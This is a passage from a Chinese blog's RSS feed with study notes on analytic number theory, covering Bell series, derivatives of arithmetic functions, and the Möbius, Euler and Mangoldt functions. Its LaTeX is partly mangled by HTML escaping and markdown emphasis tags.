\mu_p(x)&amp;amp;=\sum\limits_{n=0}^{\infty}\mu(p^n)x^n \newline
&amp;amp;=\mu(p^0)x^0+\mu(p^1)x^1+\cdots+\mu(p^r)x^r+\cdots \newline
&amp;amp;=\mu(1)+\mu(p)x+0  \newline
&amp;amp;=1-x
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;欧拉函数$\varphi()$的贝尔级数：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由欧拉函数的性质我们可知：$\varphi(p^n)=p^n-p^{n-1}$。
$$
\begin{align*}
\varphi_p(x)&amp;amp;=\sum\limits_{n=0}^{\infty}\varphi(p^n)x^n \newline
&amp;amp;=\varphi(p^0)x^0+\varphi(p^1)x^1+\cdots+\varphi(p^r)x^r+\cdots \newline
&amp;amp;=\varphi(1)+\sum\limits_{n=1}^{\infty}\varphi(p^n)x^n  \newline
&amp;amp;=\varphi(1)+\sum\limits_{n=1}^{\infty}(p^n-p^{n-1})x^n  \newline
&amp;amp;=\varphi(1)+\sum\limits_{n=1}^{\infty}p^nx^n-\sum\limits_{n=1}^{\infty}p^{n-1}x^n  \newline
&amp;amp;=\sum\limits_{n=0}^{\infty}p^nx^n-x\sum\limits_{n=0}^{\infty}p^nx^n  \newline
&amp;amp;=(1-x)\sum\limits_{n=0}^{\infty}p^nx^n  \newline
&amp;amp;=\dfrac{1-x}{1-px}
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果$f$是完全积性的，那么对所有的$n\ge0$，都有$f(p^n)=f(p)^n$，所以其贝尔级数是几何级数：
$$
f_p(x)=\sum\limits_{n=0}^{\infty}f(p)^nx^n=\dfrac{1}{1-f(p)x}
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;对于恒等函数$I$,单位函数$u$，幂函数$N^\alpha$，刘维尔函数$\lambda$这些完全积性函数来说：
$$
I_p(x)=1  \newline
u_p(x)=\dfrac{1}{1-x}  \newline
N_p^\alpha(x)=\dfrac{1}{1-p^\alpha x}  \newline
\lambda_p(x)=\dfrac{1}{1-(-x)}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th1：令$f$和$g$是积性函数，则$f=g \Leftrightarrow f_p(x)=g_p(x)$对所有的素数$p$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;证明$\Rightarrow$：我们想要证明贝尔级数$f_p(x)=g_p(x)$，在形式幂级数中我们知道，两个形式幂级数$A(x)，B(x)$相等也就是$a(n)=b(n),n\ge0$。在此处也就是$f(p^n)=g(p^n)$。而$f=g$正好使得$f(p^n)=g(p^n)$。&lt;/p&gt;
&lt;p&gt;证明$\Leftarrow$：如果贝尔级数$f_p(x)=g_p(x)$，那也就是说$f(p^n)=g(p^n)$。而$f$和$g$都是积性的，同时对所有素数$p$都有相等，配合算术基本定理，得出结论$f=g$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th2：任意两个数论函数$f$和$g$，令$h=f*g$，则对任意的素数$p$，我们有
$$
h_p(x)=f_p(x)g_p(x)
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于$p^n$，他的因子只能有$1,p,p^2,\cdots,p^n$，所以对于狄利克雷卷积我们有：
$$
h(p^n)=\sum\limits_{d|p^n}f(d)g(\dfrac{p^n}{d})=\sum_{k=0}f(p^k)g(p^n-k)
$$
这是柯西乘积的形式，符合形式幂级数乘积的运算规则，所以证明
$$
h_p(x)=f_p(x)g_p(x)
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Node：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当$f$是积性函数时，贝尔级数特别有用。&lt;/p&gt;
&lt;p&gt;等比数列求和公式：
$$
S_n = \dfrac{a_nq-a_1}{q-1} = \dfrac{a_1(1-q^n)}{1-q}  \newline
S_\infty= \dfrac{a_1}{1-q}\quad(|q|&amp;lt;1,n\rightarrow\infty)
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter4-数论函数的导数&#34;&gt;Chapter4 数论函数的导数
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：对任一数论函数$f$我们定义它的导数$f^{&amp;rsquo;}$由下面给出：
$$
f&amp;rsquo;(n)=f(n)log{n} \quad对n\ge1
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;对所有的$n,I(n)logn=0$，所以有$I&amp;rsquo;=0$.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;塞尔伯格等式：$n\ge1$，我们有：
$$
\Lambda(n)logn+\sum_{d|n}\Lambda(d)\Lambda(\dfrac{n}{d})=\sum_{d|n}\mu(d)log^2\dfrac{n}{d}
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;首先有$\Lambda&lt;em&gt;u=u&amp;rsquo;$,对其求导有
$$
\Lambda&amp;rsquo;&lt;em&gt;u+\Lambda&lt;/em&gt;u&amp;rsquo;=u&amp;rsquo;&amp;rsquo;  \newline
\Lambda&amp;rsquo;&lt;em&gt;u+\Lambda&lt;/em&gt;(\Lambda&lt;/em&gt;u)=u&amp;rsquo;&#39;
$$
用$\mu=u^{-1}$去乘
$$
\Lambda&amp;rsquo;&lt;em&gt;u&lt;/em&gt;u^{-1}+\Lambda*(\Lambda*u)&lt;em&gt;u^{-1}=u&amp;rsquo;&amp;rsquo;&lt;em&gt;u^{-1}  \newline
\Lambda&amp;rsquo;+\Lambda&lt;/em&gt;\Lambda=u&amp;rsquo;&amp;rsquo;&lt;/em&gt;\mu  \newline
\Lambda(n)logn+\sum_{d|n}\Lambda(d)\Lambda(\dfrac{n}{d})=\sum_{d|n}\mu(d)log^2\dfrac{n}{d}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1:如果$f$和$g$是数论函数，我们有：
&lt;ul&gt;
&lt;li&gt;$(f+g)&amp;rsquo;=f&amp;rsquo;+g&#39;$&lt;/li&gt;
&lt;li&gt;$(f*g)&amp;rsquo;=f&amp;rsquo;&lt;em&gt;g+f&lt;/em&gt;g&#39;$&lt;/li&gt;
&lt;li&gt;$(f^{-1})&amp;rsquo;=-f&amp;rsquo;&lt;em&gt;(f&lt;/em&gt;f)^{-1}$&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;1.1：对所有的n，有$(f+g)(n)=f(n)+g(n)$&lt;/p&gt;
&lt;p&gt;1.2：
$$
\begin{align*}
(f&lt;em&gt;g)&amp;rsquo;&amp;amp;=(\sum_{d|n}f(d)g(\dfrac{n}{d}))&amp;rsquo; \newline
&amp;amp;=\sum_{d|n}f(d)g(\dfrac{n}{d})log(n) \newline
(logn= \newline logd+log\dfrac{n}{d}= \newline logd+logn-logd)
&amp;amp;=\sum_{d|n}f(d)g(\dfrac{n}{d})log(d) + \sum_{d|n}f(d)g(\dfrac{n}{d})log(\dfrac{n}{d}) \newline
&amp;amp;=\sum_{d|n}f(d)log(d)g(\dfrac{n}{d}) + \sum_{d|n}f(d)g(\dfrac{n}{d})log(\dfrac{n}{d}) \newline
&amp;amp;=\sum_{d|n}f&amp;rsquo;(d)g(\dfrac{n}{d}) + \sum_{d|n}f(d)g&amp;rsquo;(\dfrac{n}{d}) \newline
&amp;amp;=(f&amp;rsquo;&lt;em&gt;g)+(f&lt;/em&gt;g&amp;rsquo;)
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;p&gt;1.3：对公式$I&amp;rsquo;=0$使用Th1.2，由$I=f*f^{-1}$,我们有&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
I&amp;rsquo;&amp;amp;=(f&lt;em&gt;f^{-1})&amp;rsquo;  \newline
0&amp;amp;=(f&lt;/em&gt;f^{-1})&amp;rsquo; \newline
&amp;amp;=f&amp;rsquo;&lt;em&gt;f^{-1}+f&lt;/em&gt;(f^{-1})&amp;rsquo; \newline
f*(f^{-1})&amp;rsquo;&amp;amp;=-f&amp;rsquo;&lt;em&gt;f^{-1} \newline
f^{-1&lt;/em&gt;}f*(f^{-1})&amp;rsquo;&amp;amp;=-f&amp;rsquo;*f^{-1}&lt;em&gt;f^{-1} \newline
(f^{-1})&amp;rsquo;&amp;amp;=-f&amp;rsquo;&lt;em&gt;f^{-1}&lt;em&gt;f^{-1}=-f&amp;rsquo;&lt;/em&gt;(f&lt;/em&gt;f)^{-1}
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>解析数论之数论函数【其一】</title>
        <link>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%87%BD%E6%95%B0%E5%85%B6%E4%B8%80/</link>
        <pubDate>Fri, 21 Jul 2023 09:43:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%87%BD%E6%95%B0%E5%85%B6%E4%B8%80/</guid>
        <description>


&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34; fill=&#34;hsl(30, 80%, 70%)&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;本文使用&lt;strong&gt;Typora&lt;/strong&gt;编写，但Hugo使用&lt;strong&gt;KaTex&lt;/strong&gt;渲染，可能会出现不兼容状态，如需最佳体验请前往&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/DorinXL/p/17577874.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;目录&#34;&gt;目录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Chapter1 数论函数介绍&lt;/li&gt;
&lt;li&gt;Chapter2 数论函数的狄利克雷乘积&lt;/li&gt;
&lt;li&gt;Chapter3 莫比乌斯反转&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter1-数论函数介绍&#34;&gt;Chapter1 数论函数介绍
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在正整数上定义的实数或复数的函数称为数论函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;section1-莫比乌斯函数mun&#34;&gt;Section1 莫比乌斯函数$\mu(n)$
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：
$$
根据算术基本定理，将大于1的自然数n分解为若干个质数乘积形式\
n=p_1^{\alpha_1}p_2^{\alpha_2} \cdots p_k^{\alpha_k}\
\mu(n)=
\begin{cases}
1,&amp;amp;\text{if $n=1$}\
(-1)^k,&amp;amp;\text{if ${\alpha_1}={\alpha_2}= \cdots ={\alpha_k}=1$}\
0,&amp;amp;\text{otherwise}
\end{cases}
$$
对于出现莫比乌斯函数的计算来说，我们更加关注于组成n的若干素数乘积，他们的幂是否都是1。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;6&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;7&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;8&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;9&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;10&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\mu(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;-1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1:如果$n\ge1$，我们有：
$$
\sum_{d|n}\mu(d)=[\dfrac{1}{n}]=
\begin{cases}
1,&amp;amp;\text{if $n=1$}\
0,&amp;amp;\text{if $n&amp;gt;1$}
\end{cases}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;对于$n=1$，显然成立。&lt;/p&gt;
&lt;p&gt;对于$n&amp;gt;1$，将$n$分解为$n={p_1^{\alpha_1}}\cdots{p_k^{\alpha_k}}$,我们知道${p^{\alpha}}$的因子只能是$1,p,p^2,\cdots,p^\alpha$，而$n$由很多素数幂组成，在此基础上，我们只考虑那些会让$\mu$不为0的展开项，所以我们展开求和公式：
$$
\begin{align*}
\sum_{d|n}\mu(d)&amp;amp;=\mu(1)+\mu(p_1)+\cdots+\mu(p_k)\
&amp;amp;+\mu(p_1p_2)+\cdots+\mu(p_1p_2p_3)+\cdots+\mu(p_1\cdots p_k)\
&amp;amp;=1+C_{k}^{1}(-1)+C_{k}^{2}(-1)^{2}+\cdots+C_{k}^{k}(-1)^k\
&amp;amp;=(1-1)^k(二项式定理)\
&amp;amp;=0\
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;二项式定理：
$$
(x+y)^n=\tbinom{n}{0}x^ny^0+\tbinom{n}{1}x^{n-1}y^1+\cdots+\tbinom{n}{n}x^0y^n
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section2-欧拉函数varphin&#34;&gt;Section2 欧拉函数$\varphi(n)$
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;欧拉函数$\varphi(n)$被定义为不大于n并且与n互素的数的个数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;6&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;7&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;8&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;9&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;10&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\varphi(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;4&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;4&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;6&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;4&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：如果$n\ge1$，我们有：
$$
\sum_{d|n}\varphi(d)=n
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;用$S$表示不大于$n$的集合${1,2,\cdots,n}$，接下来将$S$分解为若干个不相交的集合$A$，$A(d)={k|(k,n)=d,1\le k\le n}$。集合A里面装的是对于$n$的所有因子，在$S$的范围内与$n$的最大公因数为相同$n$的因子的数放在一起。例如对于$n=10$：
$$
S={1,2,3,4,5,6,7,8,9,10}\
A(1)={1,3,7,9}\
A(2)={2,4,6,8}\
A(5)={5}\
A(10)={10}\
$$
现在我们想用一个符号表示$A$中的符号，我们选择$f(d)$来表示$A(d)$中的个数，那么就有：
$$
\sum_{d|n}f(d)=n
$$
现在我们把$(k,n)=d,0 &amp;lt; k \le n$转化为$(\dfrac{k}{d},\dfrac{n}{d})=1,0 &amp;lt; \dfrac{k}{d} \le \dfrac{n}{d}$，如此一来我们就可以找到$A(d)$的数量与$\varphi(\dfrac{k}{d})$之间的关系：$f(d)=\varphi(\dfrac{n}{d})$，于是
$$
\sum_{d|n}\varphi(\dfrac{n}{d})=n=\sum_{d|n}\varphi(d)
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2：如果$n\ge1$，我们有：
$$
\varphi(n)=\sum_{d|n}\mu(d){\dfrac{n}{d}}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;基于欧拉函数的定义我们可以将其改写为：
$$
\varphi(n)=\sum_{k=1}^{n}[\dfrac{1}{(n,k)}]
$$
我们使用莫比乌斯函数的定理来改写这个式子：
$$
\varphi(n)=\sum_{k=1}^{n}[\dfrac{1}{(n,k)}]=\sum_{k=1}^{n}\sum_{d|(n,k)}\mu(d)=\sum_{k=1}^{n}\sum_{d|n\d|k}\mu(d)
$$
如何解读上面的求和条件呢？对于n的一个固定的因子d，我们需要满足$k,1\le k \le n$是d的倍数求和。所以我们用$k=qd$代替：
$$
\varphi(n)=\sum_{d|n}\sum_{q=1}^{\dfrac{n}{d}}\mu(d)=\sum_{d|n}\mu(d)\sum_{q=1}^{\dfrac{n}{d}}1=\sum_{d|n}\mu(d)\dfrac{n}{d}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th3：如果$n&amp;gt;1$，我们有：
$$
\varphi(n)=n\prod_{p|n}(1-\dfrac{1}{p})
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;对于$n=1$，没有素数整除$1$，这个式子没有意义。&lt;/p&gt;
&lt;p&gt;对于$n&amp;gt;1$，令$p_1,p_2,\cdots,p_r$为n的不同素因子，那么我们有：
$$
\begin{align*}
\prod_{p|n}(1-\dfrac{1}{p})&amp;amp;=\prod_{i=1}^{n}(1-\dfrac{1}{p_i})\
&amp;amp;=(1-\dfrac{1}{p_1})(1-\dfrac{1}{p_2})\cdots(1-\dfrac{1}p_r{})\
&amp;amp;=1-\sum\dfrac{1}{p_i}+\sum\dfrac{1}{p_ip_j}-\sum\dfrac{1}{p_ip_jp_k}+\cdots+\dfrac{(-1)^k}{p_ip_2\cdots p_k}(这一行的分母可以看作n的因子，分子可以看作\mu(d)，因为如果出现素数平方幂会等于0)\
&amp;amp;=\sum_{d|n}\dfrac{\mu(d)}{d}
\end{align*}
$$
所以有
$$
\varphi(n)=\sum_{d|n}\mu(d)\dfrac{n}{d}=n\sum_{d|n}\dfrac{\mu(d)}{d}=n\prod_{p|n}(1-\dfrac{1}{p})
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th4：欧拉函数有如下性质：
&lt;ol&gt;
&lt;li&gt;对于素数$P$与$\alpha\ge1$,有$\varphi(P^\alpha)=p^{\alpha}-p^{\alpha-1}$。&lt;/li&gt;
&lt;li&gt;$\varphi(mn)=\varphi(m)\varphi(n)(\dfrac{d}{\varphi(d)})$，这里$d=(m,n)$。&lt;/li&gt;
&lt;li&gt;$\varphi(mn)=\varphi(m)\varphi(n)$，如果$(m,n)=1$。&lt;/li&gt;
&lt;li&gt;$a|b$得出$\varphi(a)|\varphi(b)$&lt;/li&gt;
&lt;li&gt;当$n\ge3$时，$\varphi(n)$是偶数，而且，如果$n$有$r$个不同的奇素因子时，$2^r|\varphi(n)$。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;4.1：在$\varphi(n)=n\prod\limits_{p|n}(1-\dfrac{1}{p})$中取$n=P^\alpha$得证。&lt;/p&gt;
&lt;p&gt;4.2：假设有$m,n$两个整数，$mn$积的每一个素因数也是$m$或者$n$的素因数，我们将$p|m,p|n$的素因子$p$遍历出来，会出现重复的因子，为了防止多余计算，我们将多出来的这些出现过的因子除去，于是结合Th3就有了下面的式子：
$$
\dfrac{\varphi(mn)}{mn}=\prod_{p|mn}(1-\dfrac{1}{p})=\dfrac{\prod_{p|m}(1-\dfrac{1}{p})\prod_{p|n}(1-\dfrac{1}{p})}{\prod_{p|(m,n)}(1-\dfrac{1}{p})}=\dfrac{\dfrac{\varphi(m)}{m} \dfrac{\varphi(n)}{n}}{\dfrac{\varphi(d)}{d}}
$$
4.3：是4.2的特殊情况&lt;/p&gt;
&lt;p&gt;4.4：由$a|b$我们得出$b=ac,1\le c \le b$，如果$c=b$，那么$a=1$，$\varphi(a)|\varphi(b)$成立。&lt;/p&gt;
&lt;p&gt;如果$c&amp;lt;b$：
$$
\varphi(b)=\varphi(ac)=\varphi(a)\varphi(c)\dfrac{d}{\varphi(d)}=d\varphi(a)\dfrac{\varphi(c)}{\varphi(d)},d=(a,c)
$$
接下来使用归纳法，假设对所有小于$b$的整数，$\varphi(a)|\varphi(b)$成立，那么作为小于$b$的$c$自然满足这一式子，那么既然$d=(a,c),d|c$，于是就有$\varphi(d)|\varphi(c)$，于是上面式子的右侧就变成了$\varphi(a)$的倍数。于是$\varphi(a)|\varphi(b)$成立。&lt;/p&gt;
&lt;p&gt;4.5：我们假设$n是偶数，n=2^\alpha,\alpha\ge2$，那么由4.1我们知道$\varphi(n)$肯定是偶数。如果n至少有一个奇数素因子，我们写：
$$
\varphi(n)=n\prod_{p|n}\dfrac{p-1}{p}=\dfrac{n}{\prod_{p|n}p}\prod_{p|n}(p-1)=C(n)\prod_{p|n}(p-1)
$$
对于上面的式子，$C(n)$是一个整数，而$\prod_{p|n}(p-1)$是一个偶数（因为有至少一个素因子的贡献），所以$\varphi(n)$是偶数。&lt;/p&gt;
&lt;p&gt;如果$n$有$r$个不同的奇素因子时，每个素因子都能在上面的式子$\prod_{p|n}(p-1)$中提供一个因子2，于是就有$2^r|\varphi(n)$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section3-恒等函数in单位函数un&#34;&gt;Section3 恒等函数$I(n)$、单位函数$u(n)$
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：
$$
I(n)=[\dfrac{1}{n}]=
\begin{cases}
1,&amp;amp;\text{n=1}\
0,&amp;amp;\text{n&amp;gt;1}
\end{cases}\
u(n)=1
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：（该定理需要前置知识狄利克雷卷积）对所有的$f$，我们有$I&lt;em&gt;f=f&lt;/em&gt;I=f$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;$$
(f*I)(n)=\sum_{d|n}f(d)I(\dfrac{n}{d})=\sum_{d|n}f(d)[\dfrac{d}{n}]=f(n)
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section4-mangoldt曼戈尔特函数lambdan&#34;&gt;Section4 Mangoldt(曼戈尔特函数)$\Lambda(n)$
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：对每一个整数$n\ge1$，我们定义
$$
\Lambda(n)=
\begin{cases}
\log_{}{p}&amp;amp;如果n=p^m,p为素数，m\ge1 \
0&amp;amp;其他
\end{cases}
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;n&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;1&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;2&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;3&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;4&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;5&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;6&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;7&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;8&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;9&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;10&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\Lambda(n)$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{2}$&lt;/td&gt;
